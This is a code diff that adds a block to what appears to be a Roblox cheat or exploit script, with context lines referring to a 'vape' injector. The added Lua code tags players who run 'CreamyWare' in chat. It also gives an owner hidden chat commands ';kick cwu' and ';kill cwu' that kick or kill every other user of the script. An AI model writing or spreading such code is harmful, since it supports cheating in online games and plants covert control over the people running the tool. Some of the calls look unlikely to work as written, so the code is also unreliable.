@@ -1,3 +1,45 @@
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Track CreamyWare users
+_G.CreamyWareUsers = _G.CreamyWareUsers or {}
+_G.CreamyWareUsers[LocalPlayer.UserId] = true
+
+-- Chat tag display
+TextChatService.OnIncomingMessage = function(message)
+    local props = Instance.new("TextChatMessageProperties")
+    if message.TextSource then
+        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if _G.CreamyWareUsers[sender.UserId] then
+            local tag = sender.UserId == _G.Owner and (_G.OwnerTag or "CreamyWare Owner") or "CreamyWare User"
+            props.PrefixText = `<font color="#CC00CC">[{tag}]</font> {message.PrefixText}`
+        end
+    end
+    return props
+end
+
+-- Command handling
+Players.PlayerChatted:Connect(function(sender, message)
+    if not (_G.Owner and sender.UserId == _G.Owner) then return end
+    message = message:lower()
+
+    if message == ";kick cwu" then
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
+                target:Kick("Kicked by CreamyWare Owner")
+            end
+        end
+    elseif message == ";kill cwu" then
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
+                local char = target.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum then hum.Health = 0 end
+            end
+        end
+    end
+end)
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
